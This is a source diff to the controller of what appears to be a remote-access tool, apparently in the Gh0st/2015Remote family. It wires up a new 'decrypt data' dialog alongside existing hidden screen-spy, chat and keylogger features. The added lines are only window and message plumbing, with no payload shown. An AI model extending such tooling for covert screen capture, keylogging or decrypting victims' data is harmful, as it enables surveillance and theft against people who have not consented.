@@ -34,6 +34,7 @@
 #include "HideScreenSpyDlg.h"
 #include <sys/MachineDlg.h>
 #include "Chat.h"
+#include "DecryptDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -356,6 +357,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENHIDESCREENDLG, OnOpenHideScreenDialog)
 	ON_MESSAGE(WM_OPENMACHINEMGRDLG, OnOpenMachineManagerDialog)
 	ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)
+	ON_MESSAGE(WM_OPENDECRYPTDIALOG, OnOpenDecryptDialog)
 	ON_MESSAGE(WM_UPXTASKRESULT, UPXProcResult)
 	ON_WM_HELPINFO()
 	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
@@ -1574,6 +1576,11 @@ VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 		Dlg->OnReceiveComplete();
 		break;
 	}
+	case DECRYPT_DLG: {
+		DecryptDlg* Dlg = (DecryptDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
 	default: {
 		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 		if (hEvent == NULL) {
@@ -1674,6 +1681,10 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 	}
 	case TOKEN_CHAT_START: { // 远程交谈
 		g_2015RemoteDlg->SendMessage(WM_OPENCHATDIALOG, 0, (LPARAM)ContextObject);
+		break;
+	}
+	case TOKEN_DECRYPT: { // 解密数据
+		g_2015RemoteDlg->SendMessage(WM_OPENDECRYPTDIALOG, 0, (LPARAM)ContextObject);
 		break;
 	}
 	case TOKEN_KEYBOARD_START: {// 键盘记录
@@ -1902,6 +1913,12 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 		case CHAT_DLG:
 		{
 			CChat* Dlg = (CChat*)p->hDlg;
+			delete Dlg;
+			break;
+		}
+		case DECRYPT_DLG:
+		{
+			DecryptDlg* Dlg = (DecryptDlg*)p->hDlg;
 			delete Dlg;
 			break;
 		}
@@ -2209,6 +2226,21 @@ LRESULT CMy2015RemoteDlg::OnOpenChatDialog(WPARAM wParam, LPARAM lParam)
 	Dlg->ShowWindow(SW_SHOW);
 
 	ContextObject->v1 = CHAT_DLG;
+	ContextObject->hDlg = Dlg;
+
+	return 0;
+}
+
+LRESULT CMy2015RemoteDlg::OnOpenDecryptDialog(WPARAM wParam, LPARAM lParam)
+{
+	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
+
+	DecryptDlg* Dlg = new DecryptDlg(this, m_iocpServer, ContextObject);
+
+	Dlg->Create(IDD_DIALOG_DECRYPT, GetDesktopWindow());
+	Dlg->ShowWindow(SW_SHOW);
+
+	ContextObject->v1 = DECRYPT_DLG;
 	ContextObject->hDlg = Dlg;
 
 	return 0;
